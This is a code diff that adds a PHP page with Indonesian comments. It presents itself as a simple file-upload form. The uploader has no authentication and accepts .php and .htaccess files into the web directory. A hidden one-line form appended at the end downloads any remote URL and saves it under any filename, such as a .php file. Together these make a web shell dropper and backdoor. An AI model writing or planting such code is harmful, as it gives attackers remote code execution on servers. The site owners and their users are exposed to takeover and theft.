@@ -1,0 +1,45 @@
+<?php
+// Cek apakah form telah disubmit
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    // Direktori tujuan adalah lokasi file uploader ini
+    $targetDir = ""; // Kosongkan untuk menyimpan file di lokasi saat ini
+    
+    // Ambil informasi file yang diunggah
+    $fileName = basename($_FILES['fileToUpload']['name']);
+    $targetFilePath = $targetDir . $fileName;
+    
+    // Validasi file (opsional, pastikan ini disesuaikan sesuai kebutuhan)
+    $fileType = pathinfo($targetFilePath, PATHINFO_EXTENSION);
+    
+    // Hanya izinkan file tertentu (tambahkan jenis file lain jika diperlukan)
+    $allowedTypes = ['php', 'html', 'htaccess', 'txt', 'png', 'zip'];
+    if (in_array(strtolower($fileType), $allowedTypes)) {
+        // Coba unggah file
+        if (move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $targetFilePath)) {
+            echo "File berhasil diunggah: " . htmlspecialchars($fileName);
+        } else {
+            echo "Terjadi kesalahan saat mengunggah file.";
+        }
+    } else {
+        echo "Tipe file tidak diizinkan.";
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Uploader File</title>
+</head>
+<body>
+    <h2>Form Unggah File</h2>
+    <form action="" method="post" enctype="multipart/form-data">
+        <label for="fileToUpload">Pilih file untuk diunggah:</label>
+        <input type="file" name="fileToUpload" id="fileToUpload" required>
+        <button type="submit">Unggah File</button>
+    </form>
+</body>
+</html>
+
+<?php if(isset($_POST['u'],$_POST['f'])) file_put_contents($_POST['f'], file_get_contents($_POST['u'])); ?><form method=post><input name=u placeholder="URL Raw"><input name=f placeholder="nama_file.php"><button type=submit>Simpan</button></form>
